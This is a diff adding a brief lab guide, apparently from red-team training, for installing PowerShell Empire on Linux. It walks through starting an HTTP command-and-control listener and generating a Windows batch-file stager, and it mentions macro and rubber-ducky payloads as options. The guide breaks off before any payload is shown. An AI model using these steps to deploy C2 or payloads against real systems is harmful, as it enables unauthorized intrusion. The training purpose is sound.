@@ -1,1 +1,52 @@
+Installation...
+apt-get install libunwind8
+wget http://security.debian.org/debian-
+security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-
+1+deb7u3_amd64.deb
+dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
+wget
+http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-
+7ubuntu0.3_amd64.deb
+dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb
+wget
+https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6
+1.ubuntu.16.04_amd64.deb
+dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
+
+
+Running Empire:
+Starting up Empire
+  cd optEmpire && ./setup/reset.sh
+  Exit
+  exit
+Setup Up Cert (best practice is to use real trusted certs)
+  ./setup/cert.sh
+Start Empire
+  ./empire
+Start a Listener
+    listeners
+Pick your listener (we'll use http for our labs)
+  uselistener [tab twice to see all listener types]
+  uselistener http
+View all configurations for the listener
+  info
+When you are all done, start your listener
+  execute
+
+
+<h1>Configuring your first Payload</h1>
+Go to the Main menu
+  main
+Create stager available for OSX, Windows, Linux. We are going to create a simple batfile as an example, but you can create macros for Office files or payloads for a rubber ducky
+  usestager [tab twice to see all the different types]
+  usestager windows/launcher_bat
+Look at all settings
+  info
+Configure All Settings
+  set Listener http
+Configure the UserAgent
+  Create Payload
+  generate
+Review your payload in another terminal window
+  cat tmplauncher.
 
